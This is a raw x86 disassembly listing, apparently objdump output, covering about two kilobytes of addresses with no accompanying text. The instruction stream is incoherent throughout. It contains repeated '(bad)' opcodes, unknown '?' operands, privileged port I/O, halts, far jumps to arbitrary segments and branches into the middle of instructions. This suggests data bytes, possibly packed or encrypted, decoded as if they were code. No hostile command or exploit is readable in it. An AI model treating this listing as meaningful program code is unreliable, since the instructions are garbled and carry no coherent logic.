  4227ac:	xchg   ebp,eax
  4227ad:	inc    esp
  4227ae:	xlat   BYTE PTR ds:[ebx]
  4227af:	fisttp WORD PTR [esi-0x14f7a44b]
  4227b5:	mov    gs,WORD PTR [ebp+esi*8-0x11]
  4227b9:	iret   
  4227ba:	jg     0x422822
  4227bc:	cs mov edi,0xdb81ab82
  4227c2:	in     eax,dx
  4227c3:	xchg   DWORD PTR ds:0xb1194b47,ebx
  4227c9:	es pop esi
  4227cb:	rcl    BYTE PTR [edx+0x3a],cl
  4227ce:	sub    BYTE PTR [edi+ecx*8-0x57],cl
  4227d2:	ror    ebx,cl
  4227d4:	retf   0x82b4
  4227d7:	ret    
  4227d8:	jecxz  0x422859
  4227da:	enter  0x7ae9,0x5c
  4227de:	dec    ecx
  4227df:	fwait
  4227e0:	imul   edx,edx,0x76
  4227e3:	push   ds
  4227e4:	inc    ebx
  4227e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227e6:	push   esi
  4227e7:	(bad)  [ebx+0x29]
  4227ea:	jnp    0x422835
  4227ec:	enter  0x9290,0x48
  4227f0:	dec    edi
  4227f1:	aas    
  4227f2:	test   eax,0xe8ab3bb5
  4227f7:	call   0xd92d:0x9163f23c
  4227fe:	sbb    al,BYTE PTR [edi-0x36]
  422801:	imul   ecx,eax,0xffffffd3
  422804:	cmp    al,0xdc
  422806:	dec    ebp
  422807:	repz dec edx
  422809:	pop    edi
  42280a:	jge    0x422805
  42280c:	sti    
  42280d:	or     ebx,0x36d78a27
  422813:	or     eax,0x12b3c81f
  422818:	mov    dl,0xdc
  42281a:	add    dh,BYTE PTR [esi]
  42281c:	aam    0x30
  42281e:	popa   
  42281f:	unpcklps xmm3,XMMWORD PTR [ebx+0x4c48a208]
  422826:	fdivr  QWORD PTR [edi]
  422828:	sar    WORD PTR [esi-0x6b0e61d5],0x90
  422830:	jno    0x42283c
  422832:	add    al,BYTE PTR [edx]
  422834:	jne    0x422852
  422836:	out    0x90,eax
  422838:	mov    ebx,0x6b7499c1
  42283d:	les    edi,FWORD PTR [esi]
  42283f:	test   al,0xf
  422841:	mov    edi,0xb3ac60d1
  422846:	pop    ebp
  422847:	sub    BYTE PTR [ecx+eiz*4+0x18],0xe0
  42284c:	imul   esi,ebp,0x3b2a223d
  422852:	loop   0x4227dd
  422854:	hlt    
  422855:	push   esp
  422856:	bound  ecx,QWORD PTR [ebx]
  422858:	popf   
  422859:	cmp    ebp,DWORD PTR [ebx]
  42285b:	inc    ebp
  42285c:	pop    edx
  42285d:	mov    al,ds:0x46e16c57
  422862:	xchg   DWORD PTR [eax+0x17],ecx
  422865:	jecxz  0x422847
  422867:	addr16 ret 0xef12
  42286b:	xchg   BYTE PTR [edx],ch
  42286d:	sti    
  42286e:	and    ah,BYTE PTR [ebp+0x1]
  422871:	pop    ss
  422872:	aas    
  422873:	in     al,0x5a
  422875:	lea    edi,[edi]
  422877:	xor    BYTE PTR [esi+0x557fe123],cl
  42287d:	cmp    BYTE PTR [edi-0x6fea99ba],bh
  422883:	retf   0xb263
  422886:	cld    
  422887:	in     al,0x80
  422889:	sub    ebx,edx
  42288b:	jl     0x422858
  42288d:	adc    DWORD PTR [eax+eiz*4+0xf073b4],ebp
  422894:	mov    ebp,DWORD PTR [esi-0x63]
  422897:	jbe    0x422824
  422899:	(bad)  
  42289a:	cli    
  42289b:	mov    ch,0x59
  42289d:	cdq    
  42289e:	repnz mov ecx,0xfa924d72
  4228a4:	test   eax,0x27f7a827
  4228a9:	mov    BYTE PTR [ecx+0x7d],cl
  4228ac:	clc    
  4228ad:	loop   0x422881
  4228af:	aam    0xca
  4228b1:	adc    DWORD PTR [edx-0x14],ebp
  4228b4:	ss mov al,0x6
  4228b7:	mov    dl,dl
  4228b9:	xchg   ebp,eax
  4228ba:	call   0x262:0xd4cd8a1e
  4228c1:	jp     0x4228fe
  4228c3:	push   eax
  4228c4:	stos   BYTE PTR es:[edi],al
  4228c5:	jge    0x42291c
  4228c7:	and    ch,BYTE PTR [eax-0x42e1008b]
  4228cd:	out    0x7c,eax
  4228cf:	pushf  
  4228d0:	jge    0x422901
  4228d2:	call   FWORD PTR [edi+edx*4-0x6d]
  4228d6:	pop    esi
  4228d7:	dec    BYTE PTR [edx+0x59]
  4228da:	mov    WORD PTR [esi+0x5],?
  4228dd:	jne    0x4228a4
  4228df:	dec    DWORD PTR [edi+0x69]
  4228e2:	jbe    0x4228f4
  4228e4:	das    
  4228e5:	(bad)  
  4228e6:	jg     0x42292c
  4228e8:	nop
  4228e9:	ret    0x3d53
  4228ec:	ret    0x62c4
  4228ef:	xor    DWORD PTR [edi-0x30],ebp
  4228f2:	lahf   
  4228f3:	mov    al,0x51
  4228f5:	xor    dh,al
  4228f7:	rcr    DWORD PTR [edx+0x1a7b1453],1
  4228fd:	xor    DWORD PTR [eax],0xdc234f3f
  422903:	or     DWORD PTR [ebp-0x363d367a],eax
  422909:	inc    esi
  42290a:	out    0x40,al
  42290c:	mov    bl,0xc7
  42290e:	(bad)  
  42290f:	bound  ecx,QWORD PTR [ebx-0x57]
  422912:	cwde   
  422913:	and    BYTE PTR [ebx+0x2d],dh
  422916:	xlat   BYTE PTR ds:[ebx]
  422917:	rcr    BYTE PTR [edx-0x20],0x1c
  42291b:	ret    
  42291c:	pop    edi
  42291d:	cdq    
  42291e:	jns    0x4228a9
  422920:	lds    edx,FWORD PTR [ecx-0x21]
  422923:	fadd   QWORD PTR [esi+edi*1]
  422926:	sti    
  422927:	sub    eax,eax
  422929:	fst    QWORD PTR [ebx+edi*8]
  42292c:	mov    ebp,0xa0f0300a
  422931:	mov    ?,WORD PTR [eax+0x13]
  422934:	lea    esp,[edx+edi*2+0x3b]
  422938:	mov    WORD PTR [eax-0xa],ss
  42293b:	push   ebx
  42293c:	lds    ecx,FWORD PTR [edi+0x4]
  42293f:	pop    esi
  422940:	sahf   
  422941:	test   eax,0xb4cabee9
  422946:	(bad)  
  422948:	xor    ebx,DWORD PTR [ebx-0xe]
  42294b:	pop    esi
  42294c:	jmp    0x63f2:0xfeb662cf
  422953:	loopne 0x422972
  422955:	aam    0xa7
  422957:	xchg   ebx,eax
  422958:	add    eax,DWORD PTR [ebp+0x712fd7d4]
  42295e:	loop   0x4229d4
  422960:	jl     0x4228e3
  422962:	xchg   edi,eax
  422963:	lahf   
  422964:	fisub  DWORD PTR [ebx]
  422966:	(bad)  
  422967:	cli    
  422968:	dec    ecx
  422969:	xor    al,0xfd
  42296b:	push   ds
  42296c:	cld    
  42296d:	(bad)  
  42296e:	icebp  
  42296f:	mov    ch,0xc4
  422971:	adc    DWORD PTR [esi-0x43031991],0xe176bf76
  42297b:	sti    
  42297c:	sub    esi,ecx
  42297e:	cs jmp 0x4229a6
  422981:	test   eax,0xa2af49c8
  422986:	rol    DWORD PTR [ecx-0x3a],cl
  422989:	out    0xa9,al
  42298b:	ja     0x4229c8
  42298d:	arpl   di,si
  42298f:	jecxz  0x42293c
  422991:	std    
  422992:	xchg   dh,bh
  422994:	stos   BYTE PTR es:[edi],al
  422995:	add    edx,DWORD PTR [esi+0x45]
  422998:	ror    BYTE PTR [edx],0x94
  42299b:	lahf   
  42299c:	push   es
  42299d:	fs jmp 0x422978
  4229a0:	fwait
  4229a1:	sub    DWORD PTR [ecx+eiz*4-0x22993d],ecx
  4229a8:	inc    esi
  4229a9:	sbb    ch,BYTE PTR ds:0x3b04a4f9
  4229af:	sbb    bl,BYTE PTR [ebx+0x434bc076]
  4229b5:	repnz xchg edx,eax
  4229b7:	dec    edi
  4229b8:	arpl   WORD PTR [edx-0x4e176c3b],dx
  4229be:	and    DWORD PTR [ebx+0x43b504d0],eax
  4229c4:	stos   BYTE PTR es:[edi],al
  4229c5:	pop    ds
  4229c6:	daa    
  4229c7:	jg     0x4229af
  4229c9:	mov    esi,0x69c8210f
  4229ce:	push   ebx
  4229cf:	sub    eax,0xa456f088
  4229d4:	cmp    edx,ebx
  4229d6:	ficom  DWORD PTR [edx+esi*1+0x3]
  4229da:	xchg   edx,eax
  4229db:	imul   eax,edi,0xaefce94f
  4229e1:	push   edx
  4229e2:	rol    BYTE PTR [ecx+0x524c2617],0x6d
  4229e9:	adc    bl,BYTE PTR [edi+0x15]
  4229ec:	xor    DWORD PTR [ecx],0xfafed856
  4229f2:	cmp    al,0x12
  4229f4:	cmc    
  4229f5:	inc    ecx
  4229f6:	in     al,dx
  4229f7:	fwait
  4229f8:	icebp  
  4229f9:	xchg   esi,eax
  4229fa:	push   ds
  4229fb:	xor    BYTE PTR [ebp-0x2e],0xe1
  4229ff:	mov    ah,0xe3
  422a01:	icebp  
  422a02:	push   ss
  422a03:	adc    DWORD PTR [edi],ecx
  422a05:	clc    
  422a06:	cmc    
  422a07:	jp     0x422a04
  422a09:	jno    0x4229ba
  422a0b:	pusha  
  422a0c:	pushf  
  422a0d:	ds mov ah,0x4f
  422a10:	dec    ebx
  422a11:	add    al,0xa6
  422a13:	mov    dh,0xf4
  422a15:	test   al,0xb8
  422a17:	mov    al,ds:0x5bd136c3
  422a1c:	mov    WORD PTR es:[ecx],cs
  422a1f:	imul   esi,DWORD PTR [edx],0x245abf4e
  422a25:	test   BYTE PTR [ebx+0x12],ch
  422a28:	pop    ebp
  422a29:	add    al,0x8
  422a2b:	lock push 0xfffffff3
  422a2e:	call   0xc9cfcad5
  422a33:	retf   
  422a34:	xchg   ebx,eax
  422a35:	test   eax,0xeab91ef0
  422a3a:	gs push edx
  422a3c:	push   ecx
  422a3d:	retf   0x61c0
  422a40:	leave  
  422a41:	loop   0x422a42
  422a43:	mov    esi,ecx
  422a45:	aas    
  422a46:	cmc    
  422a47:	(bad)  
  422a48:	iret   
  422a49:	mov    ?,WORD PTR [ebx-0xd954bb]
  422a4f:	pop    ebx
  422a50:	add    BYTE PTR [ebp+0x67],0x7f
  422a54:	mov    edx,0x4ec7737f
  422a59:	(bad)  
  422a5a:	jns    0x422abb
  422a5c:	and    eax,0x36f8d56c
  422a61:	jmp    0x422a3c
  422a63:	stos   DWORD PTR es:[edi],eax
  422a64:	add    cl,BYTE PTR [ebx+0x3b]
  422a67:	pusha  
  422a68:	icebp  
  422a69:	dec    ebx
  422a6a:	(bad)  
  422a6b:	pop    eax
  422a6c:	into   
  422a6d:	inc    ebx
  422a6e:	sti    
  422a6f:	sbb    DWORD PTR [esi+0x571a4572],esp
  422a75:	jb     0x422a7d
  422a77:	ja     0x422a1a
  422a79:	xchg   edi,eax
  422a7a:	es idiv edx
  422a7d:	mov    ebx,0x6c9c5b3f
  422a82:	mov    cl,0xe2
  422a84:	shr    BYTE PTR [edx],1
  422a86:	pop    ss
  422a87:	mov    esp,0x5a24f4f9
  422a8c:	in     al,dx
  422a8d:	xchg   BYTE PTR [esi],dl
  422a8f:	neg    BYTE PTR [esp+eiz*2-0x4b50c8e5]
  422a96:	es test al,0xe1
  422a99:	inc    esi
  422a9a:	loop   0x422aab
  422a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a9d:	lock sar BYTE PTR ds:0x5e817f4f,cl
  422aa4:	cmp    esi,0x66ca41ff
  422aaa:	inc    ebp
  422aab:	jne    0x422a8d
  422aad:	pop    eax
  422aae:	pop    edx
  422aaf:	sbb    BYTE PTR [ebp+0x16],0xc
  422ab3:	adc    edi,esp
  422ab5:	nop
  422ab6:	sar    BYTE PTR [edx+edx*1],1
  422ab9:	loop   0x422a7a
  422abb:	inc    esi
  422abc:	mov    al,ds:0x206c59c7
  422ac1:	xchg   ebp,eax
  422ac2:	int3   
  422ac3:	xchg   edx,eax
  422ac4:	adc    BYTE PTR [edx-0xc],0xba
  422ac8:	dec    esp
  422ac9:	xchg   edi,eax
  422acb:	or     ah,BYTE PTR [ecx+0x0]
  422ace:	add    BYTE PTR [eax],al
  422ad0:	add    BYTE PTR [eax],al
  422ad2:	(bad)  
  422ad3:	xlat   BYTE PTR ds:[ebx]
  422ad4:	hlt    
  422ad5:	push   ebp
  422ad7:	jmp    FWORD PTR [ebx-0x21]
  422ada:	sub    al,0x7c
  422adc:	cmp    BYTE PTR [edx+0x25e97b9f],bh
  422ae2:	push   edi
  422ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ae4:	add    DWORD PTR [eax],eax
  422ae6:	repz add al,0x0
  422ae9:	add    BYTE PTR [edx],bh
  422aeb:	push   ebx
  422aec:	push   0x4b
  422aee:	addr16 add al,0xd2
  422af1:	dec    edx
  422af2:	inc    eax
  422af3:	inc    ebx
  422af4:	push   eax
  422af5:	mov    esi,0x34b348a0
  422afa:	push   cs
  422afb:	adc    eax,0x7bfaa844
  422b00:	pop    edi
  422b01:	addr16 nop
  422b03:	add    DWORD PTR [edx+0x42d5f14d],ebx
  422b09:	inc    esp
  422b0a:	ret    0x8105
  422b0d:	sub    ebp,ebx
  422b0f:	test   BYTE PTR [edi],dl
  422b11:	hlt    
  422b12:	jmp    0xcc138e02
  422b17:	pop    ds
  422b18:	mov    bh,0x4b
  422b1a:	js     0x422af2
  422b1c:	sub    BYTE PTR [esi],dh
  422b1e:	dec    edx
  422b1f:	sbb    edi,DWORD PTR [esi-0x46]
  422b22:	lock pusha 
  422b24:	lods   al,BYTE PTR ds:[esi]
  422b25:	mov    ebp,0xd633e7b
  422b2a:	ret    0x27fe
  422b2d:	sbb    DWORD PTR [ebx-0x296da98f],edi
  422b33:	jg     0x422b6e
  422b35:	stos   DWORD PTR es:[edi],eax
  422b36:	inc    ebp
  422b37:	and    eax,0xccf1711a
  422b3c:	pop    es
  422b3d:	jmp    0x422b19
  422b3f:	add    ebp,ebp
  422b41:	(bad)  
  422b42:	mov    edi,0x6d698740
  422b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b48:	das    
  422b49:	mov    BYTE PTR [eax+0xe07347f],bh
  422b4f:	pusha  
  422b50:	lea    edi,[ecx+edi*4]
  422b53:	imul   BYTE PTR [eax-0x393c39eb]
  422b59:	stos   BYTE PTR es:[edi],al
  422b5a:	ja     0x422ba7
  422b5c:	ins    DWORD PTR es:[edi],dx
  422b5d:	push   edx
  422b5e:	ins    DWORD PTR es:[edi],dx
  422b5f:	int    0x39
  422b61:	mov    ebp,0xe11bfcf5
  422b66:	jb     0x422b7f
  422b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b69:	and    esp,DWORD PTR [ebx+0x4]
  422b6c:	push   cs
  422b6d:	xor    BYTE PTR [edx],dh
  422b6f:	jecxz  0x422bcc
  422b71:	jmp    0x422bd3
  422b73:	fstp   DWORD PTR [ecx+0x56288937]
  422b79:	push   eax
  422b7a:	jns    0x422b57
  422b7c:	call   0xb038:0xfaacdc50
  422b83:	and    ebx,esp
  422b85:	mov    bh,0xce
  422b87:	icebp  
  422b88:	mov    esp,0x3eb64002
  422b8d:	outs   dx,BYTE PTR ds:[esi]
  422b8e:	xor    cl,BYTE PTR [edx+0x29973e05]
  422b94:	mov    al,0x5b
  422b96:	add    ecx,DWORD PTR ds:0x18774807
  422b9c:	test   al,0xf8
  422b9e:	bnd jo 0x422b3d
  422ba1:	stos   DWORD PTR es:[edi],eax
  422ba2:	jmp    0xf758:0x5552cc3d
  422ba9:	pop    edi
  422baa:	imul   edi,ebp,0x2b9cc481
  422bb0:	fild   WORD PTR [edx-0x4d9547ae]
  422bb6:	(bad)  
  422bb7:	cmp    bl,ah
  422bb9:	mov    ?,WORD PTR [eax]
  422bbb:	add    BYTE PTR [eax+0x8],ch
  422bbe:	pop    ebx
  422bbf:	push   ss
  422bc0:	pminub mm0,mm6
  422bc3:	cmc    
  422bc4:	into   
  422bc5:	mov    bl,0x35
  422bc7:	and    ah,BYTE PTR [ebx]
  422bc9:	mov    al,0x82
  422bcb:	mov    edi,0xa8ba4933
  422bd0:	cs and eax,0xcce52fc1
  422bd6:	mov    ebx,0x77763653
  422bdb:	inc    edx
  422bdc:	icebp  
  422bdd:	test   edx,0x52fea63e
  422be3:	mov    ebx,0x1a0bb02d
  422be8:	fbld   TBYTE PTR [edx+0x2c6b994]
  422bee:	(bad)  
  422bf0:	adc    al,0x4e
  422bf2:	add    eax,0x52825cad
  422bf7:	cmp    esi,DWORD PTR [edi]
  422bf9:	repnz xchg ecx,eax
  422bfb:	push   es
  422bfc:	or     dh,al
  422bfe:	ret    
  422bff:	jg     0x422c75
  422c01:	fisub  WORD PTR [esi+0x42]
  422c04:	and    DWORD PTR [edx+0x2f],0x77
  422c08:	repz mov bh,0x77
  422c0b:	add    al,0x29
  422c0d:	mov    ds:0xbcd5a155,eax
  422c12:	mov    esi,esi
  422c14:	test   eax,0xdc2d3dfd
  422c19:	push   edi
  422c1a:	jp     0x422c44
  422c1c:	cmp    eax,0x26ed76f1
  422c21:	iret   
  422c22:	mov    ah,BYTE PTR [esi+0x67d032da]
  422c28:	(bad)  
  422c29:	ficomp WORD PTR [ebx+edi*1+0x145dc3b9]
  422c30:	imul   BYTE PTR [edi]
  422c32:	cmp    DWORD PTR [ecx+0x6f907c8e],edi
  422c38:	pop    ecx
  422c39:	push   ecx
  422c3a:	push   ds
  422c3b:	call   0x57d7:0x792c3562
  422c42:	fcom   st(2)
  422c44:	or     BYTE PTR [ebx+0x7b],dl
  422c47:	in     eax,dx
  422c48:	pop    es
  422c49:	jp     0x422c7e
  422c4b:	jg     0x422c5b
  422c4d:	out    0xc3,eax
  422c4f:	(bad)  
  422c50:	lahf   
  422c51:	cmp    DWORD PTR [ebp+0x6629d4f7],esp
  422c57:	inc    eax
  422c58:	repnz sub BYTE PTR [esi-0x5f5e6291],0x46
  422c60:	sbb    BYTE PTR [ebx+0x61],0xbd
  422c64:	add    eax,0x56e4de0e
  422c69:	jne    0x422ce4
  422c6b:	push   0xffffffdc
  422c6d:	cmp    DWORD PTR [esi+0x54d5081b],ebx
  422c73:	jmp    0x46032735
  422c78:	loop   0x422c53
  422c7a:	dec    eax
  422c7b:	adc    ah,BYTE PTR [esp+ebp*4]
  422c7e:	lods   al,BYTE PTR ds:[esi]
  422c7f:	test   al,0x37
  422c81:	and    ah,BYTE PTR [ebp-0x6c3628de]
  422c87:	xchg   DWORD PTR [edi+edx*4],edx
  422c8a:	and    ebx,DWORD PTR [eax]
  422c8c:	cmp    bl,dl
  422c8e:	outs   dx,BYTE PTR ds:[esi]
  422c8f:	rol    edx,0xd8
  422c92:	jl     0x422cf1
  422c94:	test   eax,0x85cdceca
  422c99:	fstp   QWORD PTR [edi-0x685a2729]
  422c9f:	ja     0x422c64
  422ca1:	lods   eax,DWORD PTR ds:[esi]
  422ca2:	add    ah,BYTE PTR [eax]
  422ca4:	popa   
  422ca5:	outs   dx,BYTE PTR ds:[esi]
  422ca6:	mov    al,ds:0x6c5e2b32
  422cab:	push   cs
  422cac:	xor    eax,0x9d2af401
  422cb1:	add    eax,DWORD PTR [eax+0x51]
  422cb4:	xor    bl,al
  422cb6:	dec    esi
  422cb7:	enter  0x708e,0xaf
  422cbb:	push   ecx
  422cbc:	and    edx,edi
  422cbe:	js     0x422d08
  422cc0:	sub    dl,al
  422cc2:	inc    edi
  422cc3:	ret    
  422cc4:	pop    esi
  422cc5:	mov    esp,0x3f1866ab
  422cca:	sar    DWORD PTR [ebx+0x54999e77],cl
  422cd0:	scas   al,BYTE PTR es:[edi]
  422cd1:	(bad)  
  422cd2:	aaa    
  422cd3:	(bad)  
  422cd4:	ficomp DWORD PTR [edx]
  422cd6:	pop    ebx
  422cd7:	inc    esi
  422cd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cd9:	aas    
  422cda:	lods   al,BYTE PTR ds:[esi]
  422cdb:	mov    dl,0x8a
  422cdd:	adc    dl,BYTE PTR [esi]
  422cdf:	adc    eax,DWORD PTR [eax-0x36]
  422ce2:	dec    ebp
  422ce3:	dec    esp
  422ce4:	lahf   
  422ce5:	lods   al,BYTE PTR ds:[esi]
  422ce6:	and    DWORD PTR [ebx+0x419eaccf],edi
  422cec:	(bad)  
  422ced:	mov    ebx,0x399d8237
  422cf2:	jb     0x422ce2
  422cf4:	adc    edx,0x44
  422cf7:	daa    
  422cf8:	lods   al,BYTE PTR ds:[esi]
  422cf9:	inc    eax
  422cfa:	dec    edx
  422cfb:	xlat   BYTE PTR ds:[ebx]
  422cfc:	mov    edx,0x56058dd0
  422d01:	add    bh,BYTE PTR [eax+eiz*8-0x78]
  422d05:	add    ecx,DWORD PTR ds:0x9b818491
  422d0b:	jg     0x422cf8
  422d0d:	aaa    
  422d0e:	inc    eax
  422d0f:	mov    ds:0xf919be42,eax
  422d14:	mov    ah,0xe4
  422d16:	mov    ah,0x76
  422d18:	loop   0x422d4b
  422d1a:	inc    edi
  422d1b:	fst    QWORD PTR [esi+ecx*4+0xaab1e1]
  422d22:	or     eax,DWORD PTR ds:0x2ebc7a02
  422d28:	sbb    al,0xcd
  422d2a:	jmp    0x422d1f
  422d2c:	sub    DWORD PTR [edi],edi
  422d2e:	fwait
  422d2f:	pop    ebp
  422d30:	push   0x710c4a
  422d35:	xchg   edx,eax
  422d36:	leave  
  422d37:	mov    bl,0x62
  422d39:	and    eax,0x1aab287f
  422d3e:	ins    DWORD PTR es:[edi],dx
  422d3f:	std    
  422d40:	add    al,0x9a
  422d42:	mov    ch,0xe6
  422d44:	jge    0x422d26
  422d46:	fwait
  422d47:	in     al,dx
  422d48:	and    esi,DWORD PTR [esi+0x75]
  422d4b:	jno    0x422d3f
  422d4d:	push   0xc89204d1
  422d52:	pmullw mm7,QWORD PTR [edi+0xc]
  422d56:	mov    ebx,0xe6201c8e
  422d5b:	mov    ecx,0x7d6c29ee
  422d60:	push   cs
  422d61:	std    
  422d62:	ss adc eax,0x650fefde
  422d68:	mov    bh,0xef
  422d6a:	cmp    esp,0xffffffb8
  422d6d:	and    al,BYTE PTR [eax]
  422d6f:	mov    WORD PTR [edx+0x0],gs
  422d72:	add    eax,0x27a98746
  422d77:	call   0x16fc590b
  422d7c:	cmp    cl,BYTE PTR [edi+ebp*2-0x6701f130]
  422d83:	or     BYTE PTR [esi+0x44],bh
  422d86:	leave  
  422d87:	sti    
  422d88:	cmp    eax,0x3c5697db
  422d8d:	data16 jno 0x422dbb
  422d90:	ja     0x422d37
  422d92:	xor    al,0xc9
  422d94:	int3   
  422d95:	sbb    BYTE PTR [edi+edi*4-0x35c5f86f],dl
  422d9c:	jbe    0x422d29
  422d9e:	inc    ebx
  422d9f:	mov    al,0x63
  422da1:	push   es
  422da2:	out    0x32,eax
  422da4:	sar    DWORD PTR [edx],1
  422da6:	scas   al,BYTE PTR es:[edi]
  422da7:	cmp    dl,BYTE PTR [esi]
  422da9:	xchg   ebx,eax
  422daa:	es out 0x44,al
  422dad:	das    
  422dae:	mov    ebx,0xccdf8da3
  422db3:	scas   eax,DWORD PTR es:[edi]
  422db4:	mov    dl,0x57
  422db6:	push   eax
  422db7:	nop
  422db8:	cwde   
  422db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dba:	unpckhps xmm7,XMMWORD PTR [edx-0x65]
  422dbe:	mov    cl,0x6f
  422dc0:	inc    DWORD PTR [edx+0x6c71276e]
  422dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dc7:	and    DWORD PTR [esi-0x17313609],esi
  422dcd:	je     0x422e2c
  422dcf:	sbb    al,0x4f
  422dd1:	mov    esp,0x38640a42
  422dd6:	push   ecx
  422dd7:	iret   
  422dd8:	mov    ds:0x2d0b5633,al
  422ddd:	mov    dh,0x27
  422ddf:	stos   BYTE PTR es:[edi],al
  422de0:	cmp    BYTE PTR [eax],0xb1
  422de3:	lds    edi,FWORD PTR [ebx+0x66]
  422de6:	add    al,0x35
  422de8:	mov    ss:0xe7634057,eax
  422dee:	sahf   
  422def:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422df0:	test   dh,ch
  422df2:	and    BYTE PTR [ebx],dh
  422df4:	aaa    
  422df5:	ins    DWORD PTR es:[edi],dx
  422df6:	dec    esp
  422df7:	and    dl,al
  422df9:	out    0x70,eax
  422dfb:	mov    DWORD PTR [edi+0x3c9216e4],ebp
  422e01:	in     eax,dx
  422e02:	test   DWORD PTR [ebx],eax
  422e04:	mov    WORD PTR [ebp+0x7b317f75],?
  422e0a:	shl    DWORD PTR [ebx+0x61],0xad
  422e0e:	and    eax,0x4564aae8
  422e13:	inc    ebx
  422e14:	push   esp
  422e15:	cmp    al,0x9c
  422e17:	jl     0x422e19
  422e19:	inc    ebp
  422e1a:	in     al,dx
  422e1b:	popf   
  422e1c:	push   ebx
  422e1d:	sub    al,0xc8
  422e1f:	adc    BYTE PTR [edi-0x3a],ah
  422e22:	dec    edx
  422e23:	leave  
  422e24:	xor    bh,dh
  422e26:	inc    edi
  422e27:	repnz lods eax,DWORD PTR ds:[esi]
  422e29:	mov    dh,0xac
  422e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e2c:	repnz mov bl,0x88
  422e2f:	in     eax,0xda
  422e31:	lds    ebp,FWORD PTR [esp+eiz*2-0x6a]
  422e35:	mov    ebp,0x4802735
  422e3a:	jnp    0x422e0d
  422e3c:	(bad)  
  422e3d:	or     DWORD PTR [edi-0x14],ebx
  422e40:	pop    esp
  422e41:	and    eax,esi
  422e43:	sbb    BYTE PTR [ecx-0x77ca5d5d],dl
  422e49:	cwde   
  422e4a:	shl    BYTE PTR [edi],1
  422e4c:	push   esi
  422e4d:	inc    ax
  422e4f:	pop    ss
  422e50:	mov    bh,0x37
  422e52:	xor    esi,DWORD PTR [esi+eiz*8+0x3bf34ce6]
  422e59:	fmul   st,st(6)
  422e5b:	sub    eax,0xc001a7de
  422e60:	cmp    eax,0xbbe82ebb
  422e65:	fwait
  422e66:	mov    ds:0xae9cb005,eax
  422e6b:	inc    esi
  422e6c:	mov    ?,WORD PTR [edx-0x3f]
  422e6f:	cmp    esi,DWORD PTR [ecx+0x3c169dd1]
  422e75:	xlat   BYTE PTR ds:[ebx]
  422e76:	mov    ds,WORD PTR [edi*8+0x2f0c883e]
  422e7d:	mov    dh,0xcc
  422e7f:	shr    DWORD PTR [si-0x2a],cl
  422e83:	mov    esi,0xb766a235
  422e88:	std    
  422e89:	sub    ch,bh
  422e8b:	mov    eax,0xe10d04b0
  422e90:	and    ebx,ecx
  422e92:	jo     0x422ebe
  422e94:	aas    
  422e95:	mov    eax,0xabf7c27
  422e9a:	sbb    al,0x3
  422e9c:	sub    al,0xdc
  422e9e:	xchg   ecx,eax
  422e9f:	ins    DWORD PTR es:[edi],dx
  422ea0:	ficomp WORD PTR [edi+0x3d361355]
  422ea6:	mov    eax,0xe5ad0ffd
  422eab:	mov    bl,0x49
  422ead:	mov    bh,0x6b
  422eaf:	stos   DWORD PTR es:[edi],eax
  422eb0:	mov    ah,0x56
  422eb2:	repz or al,0xf2
  422eb5:	stc    
  422eb6:	in     al,0x64
  422eb8:	xor    eax,0x5a739c8d
  422ebd:	rcl    DWORD PTR [eax],cl
  422ebf:	cmp    al,0xeb
  422ec1:	xor    BYTE PTR [ecx-0x17],ah
  422ec4:	mov    gs,WORD PTR [edi]
  422ec6:	aaa    
  422ec7:	push   edi
  422ec8:	inc    edx
  422ec9:	aam    0x5c
  422ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ecc:	cdq    
  422ecd:	xor    DWORD PTR [edx-0x7a1b5ced],0x3d
  422ed4:	dec    esp
  422ed5:	mov    BYTE PTR [eax],0x54
  422ed8:	adc    DWORD PTR [ebx-0x99c7841],ecx
  422ede:	mov    edi,0xa9fb19c0
  422ee3:	xor    eax,0xee0f17e1
  422ee8:	dec    eax
  422ee9:	xor    DWORD PTR [ebx],ebx
  422eeb:	(bad)  
  422eec:	repz pop esp
  422eee:	mov    WORD PTR ds:0xf5c678b4,cs
  422ef4:	and    DWORD PTR [eax-0x722741cc],eax
  422efa:	fwait
  422efb:	mov    dh,0xaa
  422efd:	mov    ebx,DWORD PTR [ecx-0x3eff50dd]
  422f03:	mov    dh,0x3f
  422f05:	xor    BYTE PTR [eax+0x5ab6573f],0xe4
  422f0c:	sub    esp,DWORD PTR [edx+0x3f3aceaa]
  422f12:	add    eax,0x17b2146f
  422f17:	cdq    
  422f18:	mov    ah,0xaf
  422f1a:	and    esp,DWORD PTR [edx-0x6f]
  422f1d:	inc    esi
  422f1e:	shl    al,1
  422f20:	ret    
  422f21:	imul   BYTE PTR [edi+0x24]
  422f24:	out    dx,al
  422f25:	repz jae 0x422f48
  422f28:	push   edi
  422f29:	dec    ecx
  422f2a:	mov    bl,0xc9
  422f2c:	call   0x742885c7
  422f31:	push   0x6fcac5aa
  422f36:	jno    0x422f18
  422f38:	repnz mov BYTE PTR [eax],cl
  422f3b:	jl     0x422f81
  422f3d:	out    dx,eax
  422f3e:	outs   dx,BYTE PTR ds:[esi]
  422f3f:	add    BYTE PTR [eax+0x68],0x39
  422f43:	sbb    al,0x9e
  422f45:	cli    
  422f46:	or     BYTE PTR [eax],al
  422f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f49:	xor    ah,BYTE PTR [esi]
  422f4b:	mov    esp,0x3d458e
  422f50:	xchg   ebp,eax
  422f51:	sbb    al,0xd
  422f54:	mov    ah,0x88
  422f56:	mov    eax,ds:0xf95ca173
  422f5b:	loopne 0x422f6b
  422f5d:	pop    edi
  422f5e:	js     0x422f24
  422f60:	adc    al,0x56
  422f62:	fcomp  QWORD PTR [edx]
  422f64:	out    dx,al
  422f65:	pushf  
  422f66:	ficomp WORD PTR [edx-0x71]
  422f69:	cld    
  422f6a:	add    DWORD PTR [ecx],eax
  422f6c:	and    al,0x9a
  422f6e:	adc    bh,BYTE PTR [eax]
